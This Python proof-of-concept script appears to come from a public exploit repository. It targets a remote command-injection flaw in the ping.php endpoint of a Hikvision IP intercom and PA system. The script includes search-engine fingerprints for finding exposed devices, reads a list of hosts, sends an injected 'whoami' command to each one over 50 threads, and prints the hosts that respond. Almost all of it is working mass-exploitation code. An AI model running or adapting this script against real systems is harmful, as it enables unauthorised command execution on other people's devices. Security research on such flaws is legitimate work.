#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# fofa：icon_hash="-1830859634"
# zoomeye: iconhash: "e854b2eaa9e4685a95d8052d5e3165bc"
# hunter: web.title=="IP Intercom & PA System"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+-------------------------------------------------------------------------------------------------- -------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                       +')
    print(
        '+ EXP: python3 Hikvison_IP_Duijiang_Ping_Rce.py url.txt                                                  +')
    print(
        '+-------------------------------------------------------------------------------------------------- --------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8080'
} 
def poc(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Chrome/83.0.4103.116 Safari/537.36",
        "Accept-Encoding":"gzip, deflate",
        "Accept": "*/*",
        "Connection":"close",
        "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
        "Host":"%s" % host2,
        "X-Requested-With": "XMLHttpRequest"

    }
    vulurl = url + "/php/ping.php"
    data="jsondata%5Btype%5D=99&jsondata%5Bip%5D=whoami"
    try:
        r = requests.post(vulurl, headers=headers,data=data)
        # print(r.content)
        
        if ("admin" or "root" in r.text) and len(r.text) > 20 and len(r.text) < 100 and "res" not in r.text and "whoami" not in r.text: 
            print(host+str(r.text))
            #print(r.text)
        else:
            return 0
    except:
        return 0


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(poc, row[0])